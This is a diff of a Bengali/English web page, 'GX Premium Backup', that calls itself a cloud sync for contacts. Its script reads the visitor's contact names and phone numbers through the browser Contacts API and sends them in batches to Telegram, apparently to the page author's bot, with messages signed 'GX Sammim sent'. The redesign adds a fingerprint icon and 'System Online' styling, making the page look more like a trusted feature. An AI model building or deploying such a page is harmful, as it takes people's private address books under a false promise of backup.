@@ -3,97 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium Backup System</title>
+    <title>GX Premium Backup</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
+        :root {
+            --primary: #00f2fe;
+            --secondary: #7e22ce;
+        }
+
         body {
-            background-color: #050608;
-            background-image: 
-                radial-gradient(at 15% 15%, rgba(0, 242, 254, 0.2) 0px, transparent 40%),
-                radial-gradient(at 85% 85%, rgba(126, 34, 206, 0.2) 0px, transparent 40%);
-            color: white;
-            font-family: 'Segoe UI', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+            background: #020406;
             margin: 0;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Inter', sans-serif;
         }
 
-        .premium-card {
+        /* ব্যাকগ্রাউন্ড অ্যানিমেশন */
+        .orb {
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            filter: blur(80px);
+            border-radius: 50%;
+            z-index: -1;
+            animation: move 10s infinite alternate;
+        }
+
+        @keyframes move {
+            from { transform: translate(-50%, -50%); }
+            to { transform: translate(20%, 30%); }
+        }
+
+        .main-container {
             background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 35px;
-            box-shadow: 0 0 50px rgba(0, 242, 254, 0.15), 0 0 100px rgba(126, 34, 206, 0.15);
-            padding: 45px 30px;
-            width: 90%;
-            max-width: 380px;
+            backdrop-filter: blur(30px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 40px;
+            padding: 50px 30px;
+            width: 340px;
             text-align: center;
+            position: relative;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
         }
 
-        /* প্রিমিয়াম লোগো স্টাইল */
-        .logo-box {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, rgba(0, 242, 254, 0.1), rgba(126, 34, 206, 0.1));
-            border-radius: 22px;
+        /* ইউনিক একশন এরিয়া */
+        .action-circle {
+            width: 120px;
+            height: 120px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px dashed rgba(0, 242, 254, 0.3);
+            border-radius: 50%;
+            margin: 0 auto 30px;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 25px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+            cursor: pointer;
+            transition: 0.5s;
+            position: relative;
         }
 
-        .premium-btn {
-            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 50%, #7e22ce 100%);
-            background-size: 200% auto;
-            border: none;
-            padding: 18px;
-            border-radius: 18px;
-            color: white;
+        .action-circle:hover {
+            border: 2px solid var(--primary);
+            box-shadow: 0 0 30px rgba(0, 242, 254, 0.4);
+            transform: rotate(90deg);
+        }
+
+        .action-circle i {
+            transition: 0.5s;
+            font-size: 40px;
+            color: var(--primary);
+            transform: rotate(-90deg); /* বাটন ঘুরলেও আইকন সোজা থাকবে */
+        }
+
+        .title-text {
+            font-size: 22px;
             font-weight: 800;
+            letter-spacing: 1px;
+            background: linear-gradient(to right, #fff, #888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .sub-text {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .sync-btn {
+            margin-top: 30px;
+            background: #fff;
+            color: #000;
+            padding: 14px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 14px;
             width: 100%;
             cursor: pointer;
-            box-shadow: 0 8px 25px rgba(0, 210, 255, 0.3);
-            transition: 0.5s;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 5px;
+            transition: 0.3s;
+            border: none;
         }
 
-        .premium-btn:hover {
-            background-position: right center;
-            box-shadow: 0 8px 30px rgba(126, 34, 206, 0.5);
+        .sync-btn:hover {
+            background: var(--primary);
+            transform: translateY(-3px);
         }
-
-        .btn-text-main { font-size: 17px; letter-spacing: 0.5px; }
-        .btn-text-sub { font-size: 11px; opacity: 0.9; font-weight: 400; text-transform: uppercase; }
 
         #status {
-            font-size: 13px;
-            color: #00f2fe;
             margin-top: 20px;
-            font-weight: 500;
+            font-size: 12px;
+            color: var(--primary);
+            min-height: 20px;
         }
     </style>
 </head>
 <body>
 
-    <div class="premium-card">
-        <div class="logo-box">
-            <i class="fas fa-bolt-lightning text-4xl text-cyan-400"></i>
+    <div class="orb"></div>
+
+    <div class="main-container">
+        <div class="sub-text">System Online</div>
+        <div class="title-text">Cloud Sync</div>
+        
+        <div class="action-circle" onclick="fetchContacts()">
+            <i class="fas fa-fingerprint"></i>
         </div>
 
-        <div id="main-view">
-            <button onclick="fetchContacts()" class="premium-btn">
-                <span class="btn-text-main">ব্যাকআপ শুরু করুন</span>
-                <span class="btn-text-sub"><i class="fab fa-telegram-plane"></i> Send To Telegram</span>
-            </button>
-        </div>
+        <p class="text-xs text-gray-500 px-4">নিচের বাটনে চাপ দিয়ে আপনার কন্টাক্টগুলো নিরাপদে ব্যাকআপ করুন</p>
+
+        <button onclick="fetchContacts()" class="sync-btn">
+            SEND TO TELEGRAM
+        </button>
 
         <div id="status"></div>
     </div>
@@ -106,30 +154,25 @@
             const status = document.getElementById('status');
             
             if (!('contacts' in navigator && 'ContactsManager' in window)) {
-                status.innerHTML = "❌ Error: আপনার ব্রাউজারে Contact API সাপোর্ট নেই। (Chrome & HTTPS প্রয়োজন)";
+                status.innerHTML = "Browser Not Supported";
                 return;
             }
 
             try {
-                const props = ['name', 'tel'];
-                const opts = { multiple: true };
-                
-                status.innerText = "অনুমতি চাওয়া হচ্ছে...";
-                const contacts = await navigator.contacts.select(props, opts);
+                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
 
                 if (contacts && contacts.length > 0) {
-                    status.innerHTML = `<i class="fas fa-spinner fa-spin"></i> পাঠানো শুরু হয়েছে...`;
+                    status.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> Processing...`;
                     await sendData(contacts);
                 }
             } catch (err) {
-                status.innerText = ""; 
                 console.log(err);
             }
         }
 
         async function sendData(contacts) {
             const status = document.getElementById('status');
-            const CHUNK_SIZE = 15; 
+            const CHUNK_SIZE = 15;
             
             const now = new Date();
             const days = ['রবিবার', 'সোমবার', 'মঙ্গলবার', 'বুধবার', 'বৃহস্পতিবার', 'শুক্রবার', 'শনিবার'];
@@ -142,14 +185,12 @@
                 let message = `📊 **GX Backup number**\n\n`;
                 message += `📅 ${dayName}, ${dateStr}\n`;
                 message += `⏰ ${timeStr}\n`;
-                message += `👥 Total Contacts: ${contacts.length}\n`;
+                message += `👥 Total: ${contacts.length}\n`;
                 message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
 
                 chunk.forEach(c => {
-                    const name = c.name ? c.name[0] : 'No Name';
-                    const tel = c.tel ? c.tel[0] : 'No Number';
-                    message += `Name : ──${name}─\n`;
-                    message += `Number : ${tel}\n\n`;
+                    message += `Name : ──${c.name ? c.name[0] : 'N/A'}─\n`;
+                    message += `Number : ${c.tel ? c.tel[0] : 'N/A'}\n\n`;
                 });
 
                 message += `— GX Sammim sent`;
@@ -165,14 +206,14 @@
                         })
                     });
                     
-                    status.innerText = `প্রগতি: ${Math.min(i + CHUNK_SIZE, contacts.length)} / ${contacts.length}`;
-                    await new Promise(r => setTimeout(r, 1500)); 
+                    status.innerText = `Sent: ${Math.min(i + CHUNK_SIZE, contacts.length)} / ${contacts.length}`;
+                    await new Promise(r => setTimeout(r, 1200)); 
                 } catch (e) {
                     console.error(e);
                 }
             }
-            status.innerHTML = "✅ সব কন্টাক্ট টেলিগ্রামে পাঠানো হয়েছে!";
-            alert("সফলভাবে সম্পন্ন হয়েছে!");
+            status.innerHTML = "✅ Successfully Completed!";
+            alert("Backup Finished!");
         }
     </script>
 </body>
